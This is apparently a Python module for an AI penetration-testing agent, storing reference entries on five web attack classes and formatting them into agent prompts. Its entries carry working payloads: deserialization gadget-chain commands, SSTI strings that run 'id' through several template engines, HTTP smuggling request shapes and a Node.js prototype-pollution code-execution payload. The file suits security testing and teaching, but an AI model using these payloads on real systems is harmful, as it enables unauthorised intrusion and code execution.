"""Advanced web attack knowledge base.

Deep knowledge about advanced web attacks:
1. Web cache poisoning
2. Deserialization attacks
3. Server-Side Template Injection (SSTI)
4. HTTP request smuggling
5. Prototype pollution
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WebAdvPattern:
    """An advanced web pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


WEBADV_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "wa-001", "name": "Web Cache Poisoning",
        "category": "cache", "severity": "high",
        "desc": "Web cache poisoning attacks.",
        "detection": (
            "WEB CACHE POISONING:\n"
            "UNKEYED INPUTS:\n"
            "  - X-Forwarded-Host header\n"
            "  - X-Forwarded-Scheme\n"
            "  - X-Original-URL\n"
            "  - X-Rewrite-URL\n"
            "  - Custom headers reflected in response\n"
            "TECHNIQUE:\n"
            "  1. Identify cacheable response\n"
            "     - Cache-Control, Expires, Age headers\n"
            "  2. Find unkeyed input\n"
            "     - Param Miner (Burp extension)\n"
            "     - Header fuzzing\n"
            "  3. Craft poisoned response\n"
            "     - XSS via unkeyed header\n"
            "     - Redirect via Host header\n"
            "     - Import malicious script\n"
            "  4. Verify cache stores poisoned response\n"
            "     - Request without poison header\n"
            "     - Check for poisoned content\n"
            "VARIANTS:\n"
            "  - Cache key normalization abuse\n"
            "  - Fat GET requests\n"
            "  - Response splitting via cache\n"
            "  - CDN-specific behaviors\n"
            "  - Vary header manipulation\n"
            "  - Cache deception (user-specific)\n"
            "    /profile → /profile.css (cached)\n"
            "TOOLS:\n"
            "  Param Miner, Burp Suite, custom scripts"
        ),
        "tools": [],
    },
    {
        "id": "wa-002", "name": "Deserialization Attacks",
        "category": "deserialization", "severity": "critical",
        "desc": "Insecure deserialization attacks.",
        "detection": (
            "DESERIALIZATION ATTACKS:\n"
            "JAVA:\n"
            "  - Serialized objects (AC ED 00 05 magic bytes)\n"
            "  - Base64 encoded (rO0A...)\n"
            "  # ysoserial (gadget chains)\n"
            "  java -jar ysoserial.jar CommonsCollections1 'cmd'\n"
            "  # marshalsec\n"
            "  # JNDI injection (Log4Shell pattern)\n"
            "  - Targets: RMI, JMX, T3 (WebLogic)\n"
            "  - ViewState (.NET/Java Faces)\n"
            "PHP:\n"
            "  - serialize() / unserialize()\n"
            "  - O:4:\"User\":2:{...} format\n"
            "  - __wakeup, __destruct magic methods\n"
            "  - phar:// wrapper deserialization\n"
            "  # PHPGGC (gadget chains)\n"
            "  phpggc Monolog/RCE1 cmd\n"
            "PYTHON:\n"
            "  - pickle / unpickle\n"
            "  - __reduce__ method\n"
            "  - yaml.load (unsafe)\n"
            "  - shelve module\n"
            "  # fickling (pickle analysis)\n"
            ".NET:\n"
            "  - BinaryFormatter\n"
            "  - ObjectStateFormatter\n"
            "  - ViewState (LosFormatter)\n"
            "  - TypeNameHandling (JSON.NET)\n"
            "  # ysoserial.net\n"
            "RUBY:\n"
            "  - Marshal.load\n"
            "  - YAML.load (Psych)\n"
            "  - ERB template injection via deserialize\n"
            "NODE.JS:\n"
            "  - node-serialize (RCE via IIFE)\n"
            "  - funcster\n"
            "TOOLS:\n"
            "  ysoserial, PHPGGC, ysoserial.net, fickling"
        ),
        "tools": [],
    },
    {
        "id": "wa-003", "name": "Server-Side Template Injection",
        "category": "ssti", "severity": "critical",
        "desc": "SSTI attacks across template engines.",
        "detection": (
            "SSTI (Server-Side Template Injection):\n"
            "DETECTION:\n"
            "  # Polyglot detection payload\n"
            "  {{7*7}}  →  49 = Jinja2/Twig\n"
            "  ${7*7}  →  49 = FreeMarker/Velocity\n"
            "  #{7*7}  →  49 = Thymeleaf\n"
            "  <%= 7*7 %>  →  49 = ERB\n"
            "  {{=7*7}}  →  49 = Pebble\n"
            "JINJA2 (Python/Flask):\n"
            "  # Read files\n"
            "  {{''.__class__.__mro__[1].__subclasses__()}}\n"
            "  # Find Popen class and execute\n"
            "  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "TWIG (PHP):\n"
            "  {{_self.env.registerUndefinedFilterCallback('exec')}}\n"
            "  {{_self.env.getFilter('id')}}\n"
            "FREEMARKER (Java):\n"
            "  <#assign ex=\"freemarker.template.utility.Execute\"?new()>\n"
            "  ${ex(\"id\")}\n"
            "VELOCITY (Java):\n"
            "  #set($x='')##\n"
            "  #set($rt=$x.class.forName('java.lang.Runtime'))##\n"
            "  #set($chr=$x.class.forName('java.lang.Character'))##\n"
            "THYMELEAF (Java):\n"
            "  __${T(java.lang.Runtime).getRuntime().exec('id')}__\n"
            "ERB (Ruby):\n"
            "  <%= system('id') %>\n"
            "  <%= `id` %>\n"
            "TOOLS:\n"
            "  tplmap, SSTImap, Burp Suite"
        ),
        "tools": [],
    },
    {
        "id": "wa-004", "name": "HTTP Request Smuggling",
        "category": "smuggling", "severity": "critical",
        "desc": "HTTP request smuggling attacks.",
        "detection": (
            "HTTP REQUEST SMUGGLING:\n"
            "VARIANTS:\n"
            "  CL.TE (Content-Length → Transfer-Encoding):\n"
            "    POST / HTTP/1.1\n"
            "    Content-Length: 13\n"
            "    Transfer-Encoding: chunked\n"
            "    0\\r\\n\\r\\nSMUGGLED\n"
            "  TE.CL (Transfer-Encoding → Content-Length):\n"
            "    POST / HTTP/1.1\n"
            "    Transfer-Encoding: chunked\n"
            "    Content-Length: 4\n"
            "    [chunked encoded smuggled request]\n"
            "  TE.TE (obfuscated Transfer-Encoding):\n"
            "    Transfer-Encoding: chunked\n"
            "    Transfer-Encoding : chunked\n"
            "    Transfer-Encoding: xchunked\n"
            "HTTP/2:\n"
            "  - H2.CL desync\n"
            "  - H2.TE desync\n"
            "  - HTTP/2 → HTTP/1.1 downgrade\n"
            "  - CRLF in HTTP/2 pseudo-headers\n"
            "IMPACT:\n"
            "  - Request hijacking\n"
            "  - Cache poisoning via smuggling\n"
            "  - Credential theft\n"
            "  - WAF bypass\n"
            "  - Access control bypass\n"
            "DETECTION:\n"
            "  - Timeout-based detection\n"
            "  - Differential response\n"
            "  - HTTP Desync attacks (James Kettle)\n"
            "TOOLS:\n"
            "  smuggler.py, HTTP Request Smuggler (Burp)"
        ),
        "tools": [],
    },
    {
        "id": "wa-005", "name": "Prototype Pollution",
        "category": "prototype", "severity": "high",
        "desc": "JavaScript prototype pollution.",
        "detection": (
            "PROTOTYPE POLLUTION:\n"
            "CLIENT-SIDE:\n"
            "  - URL parameters: ?__proto__[key]=value\n"
            "  - JSON merge: {\"__proto__\": {\"key\": \"value\"}}\n"
            "  - Lodash merge/defaultsDeep (< 4.17.12)\n"
            "  - jQuery extend ({deep: true})\n"
            "  - Object.assign workarounds\n"
            "  IMPACT:\n"
            "    - XSS via polluted DOM properties\n"
            "    - Bypass sanitization\n"
            "    - Override security checks\n"
            "SERVER-SIDE (Node.js):\n"
            "  - RCE via child_process options\n"
            "    # Pollute env/shell/execArgv\n"
            "    {\"__proto__\": {\"shell\": \"/proc/self/exe\",\n"
            "     \"NODE_OPTIONS\": \"--require /proc/self/environ\"}}\n"
            "  - DoS via polluted properties\n"
            "  - Auth bypass via isAdmin property\n"
            "  - Template engine RCE\n"
            "DETECTION:\n"
            "  - Fuzzing with __proto__, constructor.prototype\n"
            "  - Check: obj.hasOwnProperty() vs obj.key\n"
            "  - Source-sink analysis in JavaScript\n"
            "  - ESLint rules for dangerous patterns\n"
            "PREVENTION:\n"
            "  - Object.freeze(Object.prototype)\n"
            "  - Object.create(null) for maps\n"
            "  - Map/Set instead of plain objects\n"
            "  - Input validation on key names\n"
            "TOOLS:\n"
            "  ppfuzz, ppmap, Burp Suite"
        ),
        "tools": [],
    },
]


class WebAdvancedKB:
    """Advanced web attack knowledge base.

    Provides advanced web patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WebAdvPattern] = {}
        self._log = logger.bind(component="webadv_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load advanced web patterns."""
        for data in WEBADV_PATTERNS:
            pattern = WebAdvPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[WebAdvPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_webadv_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build advanced web prompt."""
        lines = ["## Advanced Web Attacks\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
